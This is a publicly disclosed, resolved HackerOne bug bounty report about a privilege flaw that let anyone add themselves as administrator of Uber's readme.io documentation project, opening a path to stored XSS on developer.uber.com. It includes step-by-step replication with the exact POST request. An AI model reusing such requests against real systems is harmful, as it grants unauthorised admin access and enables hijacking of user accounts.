---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '152067'
original_report_id: '152067'
title: Stored XSS on developer.uber.com via admin account compromise
weakness: Cross-site Scripting (XSS) - Generic
team_handle: uber
created_at: '2016-07-18T14:39:27.285Z'
disclosed_at: '2016-08-12T16:22:23.217Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 34
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Stored XSS on developer.uber.com via admin account compromise

## Metadata

- HackerOne Report ID: 152067
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: uber
- Disclosed At: 2016-08-12T16:22:23.217Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

Anyone can add themselves as an administrator on the readme.io uber project that powers developer.uber.com/documentation

To replicate this, first fetch https://uber.readme.io/inactiveand and grab Uber's project ID from the source: 578cd33dc27ce20e004e397b

Then, using this ID, create a normal account on readme.io, verify the email address, log in, and send the following HTTP request:

POST /api/accept-invite/5617f98f7f74330d00dfd86d HTTP/1.1
Host: dash.readme.io
Connection: close
Content-Length: 2
Accept: application/json, text/plain, */*
X-NewRelic-ID: XQEHWF5UGwYHXVlSDgY=
Origin: https://dash.readme.io
X-XSRF-TOKEN:<your token here>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
DNT: 1
Referer: https://dash.readme.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
Cookie: <your cookies here>


The server will respond with "Invite doesn't exist". However, if you go to dash.readme.io you will find that you can now access uber as an administrator. After logging in, I went straight to the users page, took a screenshot as evidence (attached) and removed myself as an administrator. 

Administrators are able to inject arbitrary JavaScript into documentation pages by design, so this could be used for a stored XSS attack on developer.uber.com to hijack developer accounts.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
